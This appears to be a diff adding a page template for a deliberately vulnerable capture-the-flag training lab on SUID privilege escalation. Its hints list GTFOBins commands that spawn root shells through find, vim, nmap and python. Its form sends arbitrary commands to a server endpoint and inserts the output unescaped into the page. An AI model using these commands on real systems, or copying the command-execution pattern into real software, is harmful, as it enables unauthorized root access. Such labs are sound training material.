@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
+  <div class="lab-container">
+    <div class="lab-header"><h1><i class="fas fa-user-shield"></i> SUID Exploitation</h1><div class="lab-info"><span class="lab-tag difficulty-medium">Medium</span></div></div>
+    <div class="lab-section"><h2><i class="fas fa-crosshairs"></i> Objective</h2><p>Find SUID binaries that can be exploited to escalate privileges to root. Use GTFOBins techniques to break out of restricted shells or read protected files.</p></div>
+    <div class="lab-section"><h2><i class="fas fa-terminal"></i> System Information</h2>
+      <div class="code-block">
+        <h4>SUID Binaries Found:</h4>
+        <pre><% if (systemInfo && systemInfo.suidBinaries) { systemInfo.suidBinaries.forEach(function(bin) { %>
+<%= bin %>
+<% }); } %></pre>
+      </div>
+      <div class="vulnerable-form" style="margin-top:1rem;">
+        <div style="margin-bottom:1rem;">
+          <label for="suidCmd">Command to Execute:</label>
+          <input type="text" id="suidCmd" placeholder="/usr/bin/find / -exec /bin/sh -p \\;" value="">
+        </div>
+        <button class="btn" onclick="exploitSuid()"><i class="fas fa-play"></i> Execute</button>
+      </div>
+      <div id="suidResults" class="result-box" style="margin-top:1rem;"></div>
+      <div class="code-block">
+        <h4><i class="fas fa-lightbulb"></i> Hints</h4>
+        <pre>
+# Find SUID binaries:
+find / -perm -4000 -type f 2>/dev/null
+
+# GTFOBins exploitation:
+# find:    find . -exec /bin/sh -p \;
+# vim:     vim -c ':!/bin/sh'
+# nmap:    nmap --interactive → !sh
+# python:  python -c 'import os; os.execl("/bin/sh","sh","-p")'
+
+# Check: https://gtfobins.github.io/
+        </pre>
+      </div>
+    </div>
+    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('privesc-suid','flagInput_suid','flagResult_suid'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_suid" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
+      <div id="flagResult_suid" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+  <script>
+    async function exploitSuid() {
+      const command = document.getElementById('suidCmd').value;
+      const resultsDiv = document.getElementById('suidResults');
+      resultsDiv.innerHTML = '<p style="color:var(--primary)"><i class="fas fa-spinner fa-spin"></i> Executing...</p>';
+      try {
+        const res = await fetch('/api/labs/privesc/suid', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ command }) });
+        const data = await res.json();
+        resultsDiv.innerHTML = '<pre style="color:var(--text);white-space:pre-wrap;">' + (data.output || data.error || 'No output') + '</pre>';
+      } catch(e) { resultsDiv.innerHTML = '<p style="color:#ff4444">Error: ' + e.message + '</p>'; }
+    }
+  </script>
+</body>
+</html>
